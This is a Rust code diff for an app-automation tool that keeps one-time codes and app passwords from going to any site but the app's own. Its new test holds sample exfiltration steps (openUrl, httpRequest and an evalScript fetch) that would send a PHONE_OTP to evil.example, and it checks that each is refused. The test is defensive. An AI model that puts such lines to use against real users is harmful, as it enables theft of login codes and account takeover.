@@ -338,7 +338,9 @@ impl Ctx {
     }
 
     fn subst(&self, s: &str) -> Result<String> {
-        substitute_with(s, &guard(&self.vars)).map_err(Error::Flow)
+        // Not under the lock: a one-time code can wait for a person (E1).
+        let vars = guard(&self.vars).clone();
+        substitute_with(s, &vars).map_err(Error::Flow)
     }
 }
 
@@ -1041,7 +1043,9 @@ fn exec_with<'a>(d: &'a dyn Driver, step: &'a Step, ctx: &'a Ctx, confirmed: boo
                 return Err(Error::Flow("a password of this app is never put into evalScript: a script could send it anywhere".into()));
             }
             let at = match step {
-                Step::OpenUrl(u) => Some(subst(u)?),
+                // Checked with a one-time code left out: nobody is asked for a code before its
+                // address is known to be the app's own (Security #233 M1).
+                Step::OpenUrl(u) => Some(crate::dsl::substitute_for_check(u, &guard(&ctx.vars).clone()).map_err(Error::Flow)?),
                 // Where it is typed: the field's own document, also inside an iframe (M1).
                 Step::InputText { into, .. } if d.platform() == Platform::Web => d.url_of(into).await,
                 _ => d.current_url().await,
@@ -1378,25 +1382,29 @@ fn set_var(ctx: &Ctx, name: &str, value: String, secret: bool) {
 /// S-1: would this step's text, its variables filled in, carry a password saved for the app?
 /// (A variable that cannot be filled fails the step itself, with its own message.)
 fn holds_app_secret(ctx: &Ctx, text: &str) -> bool {
-    let names = crate::dsl::var_names(text);
+    let vars = guard(&ctx.vars).clone();
     // Security #237 M1: by name as well as by value, so a short password (1-3 characters, found
     // by value only where it stands alone) is held to its site wherever it is put: a `${NAME}`
     // saved for the app, or a flow variable that holds exactly such a value (a runFlow `env` copy).
-    let vars = guard(&ctx.vars).clone();
-    let by_name = names.iter().any(|n| match vars.get(n) {
+    let by_name = crate::dsl::var_names(text).iter().any(|n| match vars.get(n) {
         Some(v) => crate::dsl::is_app_value(v),
         None => crate::secrets::lookup(n).is_some(),
     });
     // As written (the value itself, L2), then with its variables filled in.
-    by_name || crate::dsl::holds_app_secret(text) || (!names.is_empty() && ctx.subst(text).is_ok_and(|t| crate::dsl::holds_app_secret(&t)))
+    by_name
+        || crate::dsl::holds_app_secret(text)
+        || crate::dsl::asks_code(text, &vars)
+        || (!crate::dsl::var_names(text).is_empty() && crate::dsl::substitute_for_check(text, &vars).is_ok_and(|t| crate::dsl::holds_app_secret(&t)))
 }
 
 async fn http_request(h: &HttpRequest, ctx: &Ctx) -> Result<Option<String>> {
-    let url = ctx.subst(&h.url)?;
-    // S-1 (E2): a password goes only to its app's own site.
+    // S-1 (E2): a password goes only to its app's own site; a one-time code too, checked before
+    // anyone is asked for it (Security #233 M1).
     if holds_app_secret(ctx, &format!("{h:?}")) {
-        crate::secrets::allowed_at(Some(&url), Platform::Web).map_err(Error::Flow)?;
+        let at = crate::dsl::substitute_for_check(&h.url, &guard(&ctx.vars).clone()).map_err(Error::Flow)?;
+        crate::secrets::allowed_at(Some(&at), Platform::Web).map_err(Error::Flow)?;
     }
+    let url = ctx.subst(&h.url)?;
     let method = reqwest::Method::from_bytes(h.method.as_bytes()).map_err(|e| Error::Flow(e.to_string()))?;
     let mut req = http().request(method, &url);
     for (k, v) in &h.headers {
@@ -2222,6 +2230,45 @@ mod tests {
             }
         }
         let _ = std::fs::remove_dir_all(&home);
+    }
+
+    /// Security #233 M1: a one-time code the person would type is held to the app's own site
+    /// before anyone is asked: an address, a request or a script that would carry it elsewhere is
+    /// refused, and no ask is written.
+    #[tokio::test]
+    #[allow(clippy::await_holding_lock)]
+    async fn a_one_time_code_is_never_asked_for_another_site() {
+        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
+        let dir = std::env::temp_dir().join(format!("fp-m1-codes-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        // SAFETY: test-only env mutation, serialized by ENV_LOCK.
+        unsafe {
+            std::env::set_var(crate::codes::ENV, &dir);
+            std::env::set_var("FASTPILOT_ALLOW_EVAL_SCRIPT", "true");
+            std::env::set_var("FASTPILOT_CODE_WAIT_MS", "300");
+        }
+        crate::secrets::set_scope(Some(crate::secrets::Scope { app: "shop".into(), web: Some("https://shop.example/login".into()), android: None, ios: None }));
+        let web = Recorder { platform: Platform::Web, calls: Arc::new(Mutex::new(Vec::new())) };
+        for flow in [
+            "- openUrl: \"https://evil.example/c?${PHONE_OTP}\"\n",
+            "- httpRequest: { method: GET, url: \"https://evil.example/c?${PHONE_OTP}\" }\n",
+            "- evalScript: \"fetch('https://evil.example/?' + '${PHONE_OTP}')\"\n",
+            "- inputText: { into: Code, text: \"${PHONE_OTP}\" }\n",
+        ] {
+            let step = crate::dsl::parse_flow(flow).expect("flow").steps.remove(0).step;
+            let e = type_with_timeout(&web, &step).await.expect_err(flow);
+            assert!(!e.to_string().contains("one-time code needed"), "refused before asking: {flow} {e}");
+            assert_eq!(std::fs::read_dir(&dir).map(|d| d.count()).unwrap_or(0), 0, "nobody asked: {flow}");
+        }
+        assert!(web.calls.lock().unwrap_or_else(|p| p.into_inner()).iter().all(|c| !c.contains("evil")), "nothing opened");
+        crate::secrets::set_scope(None);
+        // SAFETY: as above.
+        unsafe {
+            for k in [crate::codes::ENV, "FASTPILOT_ALLOW_EVAL_SCRIPT", "FASTPILOT_CODE_WAIT_MS"] {
+                std::env::remove_var(k);
+            }
+        }
+        let _ = std::fs::remove_dir_all(&dir);
     }
 
     /// Security #237 M1 (E5): a 1-character password is held to its app's site wherever a step puts
